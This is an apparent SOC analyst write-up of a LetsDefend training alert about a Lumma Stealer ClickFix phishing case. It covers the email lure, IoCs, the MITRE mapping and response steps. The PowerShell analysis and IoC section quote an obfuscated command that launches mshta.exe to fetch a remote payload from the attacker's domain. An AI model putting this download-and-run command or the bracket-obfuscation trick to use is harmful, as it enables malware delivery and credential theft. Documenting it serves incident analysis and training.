# SOC338 - Lumma Stealer - DLL Side-Loading via ClickFix Phishing

## Executive Summary

A critical security alert was generated related to a phishing campaign associated with Lumma Stealer. The investigation confirmed that the targeted user interacted with the malicious email, accessed the phishing website, and subsequently executed obfuscated PowerShell commands that launched mshta.exe to retrieve remote content.

Correlation between email telemetry, browser history, endpoint activity, network events, and threat intelligence indicators allowed the incident to be classified as a True Positive and escalated to the Incident Response team for further analysis and containment.

## Alert Information

- Field |	Value
- Event ID |	316
- Rule |	SOC338 - Lumma Stealer - DLL Side-Loading via ClickFix Phishing
- Severity	| Critical
- Date	| March 13, 2025 - 09:44 AM
- Level	| Security Analyst
- SMTP IP	| 132.232.40.201
- Sender	|update@windows-update.site
- Recipient |	dylan@letsdefend.io
- Subject |	Upgrade your system to Windows 11 Pro for FREE
- Action	| Allowed


## Investigation Methodology
  
### 1. Initial Email Analysis

- The sender used a domain designed to impersonate Microsoft-related services: update@windows-update.site

- Additionally, the email subject offered a free Windows 11 Pro upgrade, a common social engineering lure used to entice users into interacting with malicious content.

### 2. Threat Intelligence Validation

The source IP address: 132.232.40.201

- Was identified by LetsDefend Threat Intelligence as malicious infrastructure associated with Lumma Stealer activity.

- This significantly increased confidence that the alert represented a genuine threat.

### 3. Browser History Review

- Investigation revealed that the user accessed the following website: windows-update.site

- This confirmed direct interaction with the phishing campaign.

### 4. PowerShell Analysis

Terminal history revealed execution of suspicious PowerShell commands: powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']')

- After deobfuscation, the command becomes: mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4

Key findings:

- PowerShell execution observed.
- Obfuscation used to evade security controls.
- Execution of the LOLBin mshta.exe.
- Retrieval of content from external infrastructure.

### 5. ClickFix Attack Chain Correlation

The observed activity closely matches known ClickFix campaigns:

- Phishing email delivery.
- User visits malicious website.
- Fake CAPTCHA or verification prompt displayed.
- User executes PowerShell command.
- PowerShell launches mshta.exe.
- Remote payload is downloaded.
- Lumma Stealer execution.

### 6. Network Activity Review

Investigation identified suspicious communications involving external infrastructure.

- Source	| Destination	| Port
- 172.16.17.216 |	132.232.40.201 |	SMTP
- Affected Host |	overcoatpassably.shop |	HTTP/HTTPS

The observed traffic was consistent with malware delivery behavior.

Indicators of Compromise (IoCs)

- IP Addresses | IOC	Description

- 132.232.40.201 | Malicious SMTP Source IP associated with Lumma Stealer Domains

- IOC	 | Description
- windows-update.site |	Phishing domain
- overcoatpassably.shop |	Payload delivery infrastructure
- Email Addresses | update@windows-update.site

Commands Observed

- powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']')

- mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4

### Incident Timeline

Time |	Event
09:44 AM |	Phishing email received
Later	User accessed windows-update.site
Later	Obfuscated PowerShell executed
Later	mshta.exe launched
Later	Remote payload retrieval observed
Later	SOC338 alert generated
Later	Investigation completed and escalated

### MITRE ATT&CK Mapping

- Tactic |	Technique	ID
- Initial Access	Phishing |	T1566
- Execution	User Execution: Malicious Link | T1204.001
- Execution	PowerShell |	T1059.001
- Defense Evasion	Obfuscated Files or Information |	T1027
- Defense Evasion	Signed Binary Proxy Execution: Mshta | T1218.005
- Command and Control	Ingress Tool Transfer	| T1105
- Credential Access	Credentials from Web Browsers |	T1555.003

### Final Classification

- True Positive

The investigation confirmed multiple indicators of compromise, including:

- Verified phishing email.
- User interaction with the phishing infrastructure.
- Malicious infrastructure associated with Lumma Stealer.
- Obfuscated PowerShell execution.
- Abuse of mshta.exe.
- Remote payload retrieval.
- Strong alignment with known ClickFix and Lumma Stealer TTPs.

### Recommendations
- Isolate the affected endpoint.
- Reset potentially compromised credentials.
- Review browser-stored credentials and sensitive information.
- Hunt for related IoCs across the environment.
- Investigate persistence mechanisms.
- Assess potential data exfiltration.
- Perform threat hunting for associated Lumma Stealer infrastructure.

### Lessons Learned

This case demonstrates the importance of correlating evidence across multiple data sources. While the initial alert was already highly suspicious, the investigation provided additional context by confirming user interaction with the phishing website, execution of malicious PowerShell commands, and abuse of legitimate Windows binaries for payload delivery.
